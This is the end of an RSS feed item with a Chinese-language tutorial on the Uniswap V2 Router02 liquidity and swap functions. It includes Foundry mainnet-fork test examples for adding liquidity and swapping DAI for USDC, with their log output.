height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;增加 ERC-20⇄ERC-20 池子的流动性&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#addliquidity&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#addliquidity&lt;/a&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;调用前需要先调用IERC20的Approve为Router批准额度&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Token 不能是USDT&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;如果对应的Pair不存在则会创建&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol#L41&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol#L41&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;function addLiquidity(&#xA;    address tokenA, // 添加流动性 tokenA 的地址&#xA;    address tokenB, // 添加流动性 tokenB 的地址&#xA;    uint amountADesired, // 期望添加 tokenA 的数量&#xA;    uint amountBDesired, // 期望添加 tokenB 的数量&#xA;    uint amountAMin, // 添加 tokenA 的最小数量&#xA;    uint amountBMin // 添加 tokenB 的最小数量&#xA;    address to, // 获得的流动性代币发送到的地址&#xA;    uint deadline // 过期时间&#xA;) external returns (&#xA;    uint amountA, // 实际添加 tokenA 的数量&#xA;    uint amountB, // 实际添加 tokenB 的数量&#xA;    uint liquidity // 获得流动性代币的数量&#xA;    );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;举例:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;// forge install OpenZeppelin/openzeppelin-contracts --no-commit&#xA;import &amp;#34;lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&amp;#34;;&#xA;// forge install --no-commit  Uniswap/v2-core&#xA;import &amp;#34;lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol&amp;#34;;&#xA;import &amp;#34;lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol&amp;#34;;&#xA;// forge install --no-commit Uniswap/v2-periphery&#xA;import &amp;#34;lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&amp;#34;;&#xA;&#xA;IUniswapV2Router02 constant UNISWAP_V2_ROUTER = IUniswapV2Router02(&#xA;    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&#xA;);&#xA;IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);&#xA;&#xA;contract ExampleToken is ERC20 {&#xA;    constructor(&#xA;        string memory _name,&#xA;        string memory _symbol&#xA;    ) ERC20(_name, _symbol) {&#xA;        uint256 initSupply = 100000 * 10 ** decimals();&#xA;        _mint(msg.sender, initSupply);&#xA;    }&#xA;}&#xA;&#xA;contract RouterTest is Test {&#xA;    ExampleToken ext;&#xA;&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;mainnet&amp;#34;);&#xA;        ext = new ExampleToken(&amp;#34;ExampleToken&amp;#34;, &amp;#34;EXT&amp;#34;);&#xA;        deal(address(WETH), address(this), 10000 ether);&#xA;    }&#xA;&#xA;    function testAddLiquidity() public {&#xA;        ext.approve(address(UNISWAP_V2_ROUTER), 10000 ether);&#xA;        WETH.approve(address(UNISWAP_V2_ROUTER), 1000 ether);&#xA;&#xA;        (uint amountA, uint amountB, uint liquidity) = UNISWAP_V2_ROUTER&#xA;            .addLiquidity(&#xA;                address(ext),&#xA;                address(WETH),&#xA;                10000 ether,&#xA;                1000 ether,&#xA;                0,&#xA;                0,&#xA;                address(this),&#xA;                block.timestamp &amp;#43; 1000&#xA;            );&#xA;&#xA;        console2.log(&amp;#34;amountA:&amp;#34;, amountA);&#xA;        console2.log(&amp;#34;amountB:&amp;#34;, amountB);&#xA;        console2.log(&amp;#34;liquidity:&amp;#34;, liquidity);&#xA;&#xA;        IUniswapV2Factory factory = IUniswapV2Factory(&#xA;            UNISWAP_V2_ROUTER.factory()&#xA;        );&#xA;        address pairAddress = factory.getPair(address(ext), address(WETH));&#xA;        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);&#xA;        console2.log(&amp;#34;pair address:&amp;#34;, pairAddress);&#xA;        console2.log(&amp;#34;liquidity token i have:&amp;#34;, pair.balanceOf(address(this)));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Logs:&#xA;  amountA: 10000000000000000000000&#xA;  amountB: 1000000000000000000000&#xA;  liquidity: 3162277660168379330998&#xA;  pair address: 0x35318373409608AFC0f2cdab5189B3cB28615008&#xA;  liquidity token i have: 3162277660168379330998&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;addliquidityeth&#34;&gt;&lt;span&gt;addLiquidityETH&lt;/span&gt;&#xA;  &lt;a href=&#34;#addliquidityeth&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#addliquidityeth&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#addliquidityeth&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;使用ETH和Token的增加  ERC-20⇄WETH 池子的流动性&lt;/p&gt;&#xA;&lt;p&gt;用法和&lt;code&gt;addLiquidity&lt;/code&gt;类似, 只不是ETH是通过&lt;code&gt;msg.value&lt;/code&gt;传入的&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function addLiquidityETH(&#xA;  address token,&#xA;  uint amountTokenDesired,&#xA;  uint amountTokenMin,&#xA;  uint amountETHMin,&#xA;  address to,&#xA;  uint deadline&#xA;) external payable returns (uint amountToken, uint amountETH, uint liquidity);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;removeliquidity-removeliquidityeth&#34;&gt;&lt;span&gt;removeLiquidity removeLiquidityETH&lt;/span&gt;&#xA;  &lt;a href=&#34;#removeliquidity-removeliquidityeth&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#removeliquidity&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#removeliquidity&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;增加流动性的反向操作: 降低流动性 并销毁一部分流动性代币&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;removeliquiditywithpermit--removeliquidityethwithpermit&#34;&gt;&lt;span&gt;removeLiquidityWithPermit  removeLiquidityETHWithPermit&lt;/span&gt;&#xA;  &lt;a href=&#34;#removeliquiditywithpermit--removeliquidityethwithpermit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#removeliquiditywithpermit&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#removeliquiditywithpermit&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;removeLiquidity&lt;/code&gt; 和&lt;code&gt; removeLiquidityETH&lt;/code&gt; 的Permit版本(无需提前Approve)&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;removeliquidityethsupportingfeeontransfertokens&#34;&gt;&lt;span&gt;removeLiquidityETHSupportingFeeOnTransferTokens&lt;/span&gt;&#xA;  &lt;a href=&#34;#removeliquidityethsupportingfeeontransfertokens&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#removeliquidityethsupportingfeeontransfertokens&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#removeliquidityethsupportingfeeontransfertokens&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;removeLiquidityETH&lt;/code&gt; 的 手续费转移代币 翻版&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;swap_xxx&#34;&gt;&lt;span&gt;swap_xxx&lt;/span&gt;&#xA;  &lt;a href=&#34;#swap_xxx&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;由于价格时浮动的, 所以需要确定是输入固定(就花这么多钱)还是输出固定(就换这么多东西), 不行就revert&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;函数名称&lt;/th&gt;&#xA;          &lt;th&gt;输入代币类型&lt;/th&gt;&#xA;          &lt;th&gt;输出代币类型&lt;/th&gt;&#xA;          &lt;th&gt;输入数量类型&lt;/th&gt;&#xA;          &lt;th&gt;输出数量类型&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexacttokensfortokens&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;swapExactTokensForTokens&lt;/a&gt;&lt;/td&gt;&#xA;          &lt;td&gt;ERC20代币&lt;/td&gt;&#xA;          &lt;td&gt;ERC20代币&lt;/td&gt;&#xA;          &lt;td&gt;固定数量&lt;/td&gt;&#xA;          &lt;td&gt;自动计算&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swaptokensforexacttokens&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;swapTokensForExactTokens&lt;/a&gt;&lt;/td&gt;&#xA;          &lt;td&gt;ERC20代币&lt;/td&gt;&#xA;          &lt;td&gt;ERC20代币&lt;/td&gt;&#xA;          &lt;td&gt;自动计算&lt;/td&gt;&#xA;          &lt;td&gt;固定数量&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexactethfortokens&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;swapExactETHForTokens&lt;/a&gt;&lt;/td&gt;&#xA;          &lt;td&gt;ETH&lt;/td&gt;&#xA;          &lt;td&gt;ERC20代币&lt;/td&gt;&#xA;          &lt;td&gt;固定数量&lt;/td&gt;&#xA;          &lt;td&gt;自动计算&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swaptokensforexacteth&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;swapTokensForExactETH&lt;/a&gt;&lt;/td&gt;&#xA;          &lt;td&gt;ERC20代币&lt;/td&gt;&#xA;          &lt;td&gt;ETH&lt;/td&gt;&#xA;          &lt;td&gt;自动计算&lt;/td&gt;&#xA;          &lt;td&gt;固定数量&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexacttokensforeth&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;swapExactTokensForETH&lt;/a&gt;&lt;/td&gt;&#xA;          &lt;td&gt;ERC20代币&lt;/td&gt;&#xA;          &lt;td&gt;ETH&lt;/td&gt;&#xA;          &lt;td&gt;固定数量&lt;/td&gt;&#xA;          &lt;td&gt;自动计算&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapethforexacttokens&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;swapETHForExactTokens&lt;/a&gt;&lt;/td&gt;&#xA;          &lt;td&gt;ETH&lt;/td&gt;&#xA;          &lt;td&gt;ERC20代币&lt;/td&gt;&#xA;          &lt;td&gt;自动计算&lt;/td&gt;&#xA;          &lt;td&gt;固定数量&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;deadline&lt;/code&gt;: 每次交易都需要包含一个deadline参数，表示这个交易的截止时间。如果在截止时间之前交易成功，交易就会被执行，否则交易将被取消。deadline参数是以Unix时间戳（以秒为单位）的形式提供的。在Solidity中，可以使用&lt;code&gt;block.timestamp&lt;/code&gt;获取当前区块的时间戳&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;path&lt;/code&gt; : 用于指定交易从一个代币到另一个代币的路线。在使用swap函数进行交易时，需要指定交易的输入代币和输出代币，并通过路径参数指定交易路径。路径参数是一个代币地址数组，表示交易从输入代币开始，逐步转换到输出代币的过程&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;注: 在warp之前需要先Approve&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;举例:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;forge-std/Test.sol&amp;#34;;&#xA;// forge install OpenZeppelin/openzeppelin-contracts --no-commit&#xA;import &amp;#34;lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&amp;#34;;&#xA;// forge install --no-commit  Uniswap/v2-core&#xA;import &amp;#34;lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol&amp;#34;;&#xA;import &amp;#34;lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol&amp;#34;;&#xA;// forge install --no-commit Uniswap/v2-periphery&#xA;import &amp;#34;lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&amp;#34;;&#xA;&#xA;IUniswapV2Router02 constant UNISWAP_V2_ROUTER = IUniswapV2Router02(&#xA;    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D&#xA;);&#xA;&#xA;contract RouterTest is Test {&#xA;    function setUp() public {&#xA;        vm.createSelectFork(&amp;#34;mainnet&amp;#34;);&#xA;    }&#xA;    &#xA;    function testSwap() public {&#xA;        IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);&#xA;        IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);&#xA;        deal(address(DAI), address(this), 10000 ether);&#xA;&#xA;        DAI.approve(address(UNISWAP_V2_ROUTER), 10000 ether);&#xA;&#xA;        address[] memory path = new address[](2);&#xA;        path[0] = address(DAI);&#xA;        path[1] = address(USDC);&#xA;&#xA;        uint[] memory amounts = UNISWAP_V2_ROUTER.swapExactTokensForTokens(&#xA;            10000 ether,&#xA;            1,&#xA;            path,&#xA;            address(this),&#xA;            block.timestamp&#xA;        );&#xA;        console2.log(&amp;#34;amounts[0]:&amp;#34;, amounts[0]);&#xA;        console2.log(&amp;#34;amounts[1]:&amp;#34;, amounts[1]);&#xA;        console2.log(&amp;#34;USDC i have&amp;#34;, USDC.balanceOf(address(this)));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;Logs:&#xA;  amounts[0]: 10000000000000000000000&#xA;  amounts[1]: 9963991331&#xA;  USDC i have 9963991331&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;swap_xxx_fortokenssupportingfeeontransfertokens&#34;&gt;&lt;span&gt;swap_xxx_ForTokensSupportingFeeOnTransferTokens&lt;/span&gt;&#xA;  &lt;a href=&#34;#swap_xxx_fortokenssupportingfeeontransfertokens&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;swap_xxx的手续费转移翻版&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;library&#34;&gt;&lt;span&gt;Library&lt;/span&gt;&#xA;  &lt;a href=&#34;#library&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;参考这 &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/library&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/reference/smart-contracts/library&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
